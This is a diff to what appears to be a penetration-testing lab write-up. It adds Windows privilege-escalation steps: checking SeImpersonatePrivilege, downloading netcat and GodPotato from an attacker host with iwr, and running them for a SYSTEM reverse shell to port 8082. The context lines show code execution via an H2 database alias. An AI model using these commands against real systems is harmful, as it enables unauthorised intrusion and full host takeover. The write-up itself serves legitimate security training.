@@ -89,6 +89,9 @@ CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:/Users/Public/payload.exe").getInputStream()).useDelimiter("\\Z").next()');
 ```
 
+Alternative:
+certutil netcat, then run netcat.exe with commands (credits to S1REN)
+ 
 
 ## Privesc
 
@@ -166,3 +169,23 @@ C:\Windows\system32>whoami
 whoami
 nt authority\system
 ```
+
+Alternative: 
+Checking for privileges we have identified **SeImpersontePrivilege,** that means we can use Potato exploits.
+```
+whoami.exe /priv
+```
+
+First we need to find .NET version on the target. We can do that using:
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
+Transfer .NET version 4 of GodPotato exploit and netcat binary to tony user desktop and run it to get a reverse shell.
+```
+iwr -uri http://192.168.45.212/nc64.exe -Outfile nc64.exe  
+iwr -uri http://192.168.45.212/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
+```
+
+```
+./GodPotato-NET4.exe -cmd ".\nc64.exe -e cmd.exe 192.168.45.212 8082"
+```
+
+Catch the reverse shell with penelope at port 8082.
